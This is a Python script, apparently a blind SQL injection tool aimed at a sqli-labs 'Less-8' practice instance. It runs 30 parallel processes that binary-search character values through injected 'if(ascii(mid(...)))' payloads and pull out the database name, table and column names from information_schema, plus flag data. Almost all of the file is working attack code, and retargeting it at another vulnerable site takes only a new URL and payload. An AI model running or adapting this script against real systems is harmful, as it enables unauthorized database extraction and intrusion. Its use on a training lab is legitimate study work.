import ctypes
import multiprocessing
import random
import requests
import sys
import time
from os import system
from multiprocessing import *
from prettytable import PrettyTable
from rich.console import Console
from rich.highlighter import Highlighter


def stringlist(str):
    return int(str.split("^")[0])


def quick_sort(L, first, last):
    if first < last:
        pivot_index = partition(L, first, last)
        quick_sort(L, first, pivot_index - 1)
        quick_sort(L, pivot_index + 1, last)


def partition(L, first, last):
    pivot_value = stringlist(L[first])

    leftmark = first + 1
    rightmark = last

    done = False
    while not done:
        while leftmark <= rightmark and stringlist(L[leftmark]) <= pivot_value:
            leftmark = leftmark + 1
        while stringlist(L[rightmark]) >= pivot_value and rightmark >= leftmark:
            rightmark = rightmark - 1

        if rightmark < leftmark:
            done = True
        else:
            L[leftmark], L[rightmark] = L[rightmark], L[leftmark]
    L[first], L[rightmark] = L[rightmark], L[first]

    return rightmark


def logo() -> None:
    console = Console()

    class RainbowHighlighter(Highlighter):
        def highlight(self, text):
            for index in range(len(text)):
                text.stylize(f"color({random.randint(16, 255)})", index, index + 1)

    rainbow = RainbowHighlighter()
    console.print(rainbow(''' 
            ████████\ ██\   ██\         ██\            ████████\ ███████\  
            \____██  |██ |  ██ |        \__|           \__██  __|██  __██\ 
                ██  / ██ |  ██ |        ██\ ███████\  ██\ ██ |   ██ |  ██ |
               ██  /  ████████ |██████\ ██ |██  __██\ \__|██ |   ███████  |
              ██  /   ██  __██ |\______|██ |██ |  ██ |██\ ██ |   ██  ____/ 
             ██  /    ██ |  ██ |        ██ |██ |  ██ |██ |██ |   ██ |      
            ████████\ ██ |  ██ |        ██ |██ |  ██ |██ |██ |   ██ |      
            \________|\__|  \__|        \__|\__|  \__|██ |\__|   \__|      
                                                ██\   ██ |                 
                                                \██████  |                 
                                                 \______/                  '''))


def clear() -> None:
    system('cls')
    logo()


def CtrlC(str2, start) -> None:
    while True:
        try:
            console = Console()
            name = str2
            table = PrettyTable(
                ['The blasting data is'])
            table.align = 'l'
            row = [name]
            table.add_row(row)
            if not name == '':
                clear()
                console.print(table)
                end = time.time()
                spend = end - start
                spend = int(spend)
                console.print("\n" + "[green][+]用时 -> " + str(spend) + "秒")
            else:
                raise Exception("异常")
            sys.exit()
        except Exception as e:
            print(e)
            break


def generate(q) -> None:
    for i in range(1, 100):
        q.put(i)


def booler_injection(url, q, q2, final_list,v) -> None:
    console = Console()
    while True:
        try:
            low = 32
            high = 128
            mid = (low + high) // 2
            i = q.get()
            while low < high:
                py_dict = {
                    'database': '''and if(ascii(mid((select database()),{0},1)) > {1},5,0) --+''',
                    'tables': '''and if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema = database()),{0},1)) > {1},5,0) --+''',
                    'columns': '''and if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name = 0x666C6167),{0},1)) > {1},5,0) --+''',
                    'dump': '''and if(ascii(mid((select group_concat(flag) from sqli.flag),{0},1)) > {1},5,0)'''
                }
                payload_str = py_dict['tables'].format(i, mid)
                pld = url + payload_str
                req1 = requests.get(pld)
                # console.print(pld, end='\r')
                if req1.text.find('You are in') > 0:
                    low = mid + 1
                else:
                    high = mid
                mid = (low + high) // 2
            if mid <= 32 or mid >= 127:
                q2.put(final_list)
                break
            final_list.append(str(i) + '^' + chr(mid))
            v.value = str(i)
            clear()
            console.print("[green][+]data is -> [/green]" + v.value)
        except Exception as y:
            console.print(y)
            break


if __name__ == '__main__':
    '''运行前修改URL,payload,判断依据'''
    final_list = multiprocessing.Manager().list()
    v = multiprocessing.Manager().Value(ctypes.c_char_p, '')  # 创建临界
    console = Console()
    start = time.time()
    q2 = Queue()
    q = Queue()
    url = "http://29321b0bf0dd4725a13c87313f06a767.app.mituan.zone/Less-8/?id=1'"
    process_list = []
    generate(q)
    for i in range(30):
        p = Process(target=booler_injection, args=(url, q, q2, final_list,v))
        p.start()
        process_list.append(p)
    for p in process_list:
        p.join()
    arr2 = q2.get()
    arr2 = list(filter(None, arr2))
    quick_sort(arr2, 0, len(arr2) - 1)
    for h in range(len(arr2)):
        str2 = arr2[h]
        str2 = str2.split("^")[1]
        arr2[h] = str2
    CtrlC(''.join(arr2).replace(',', '\n'), start)
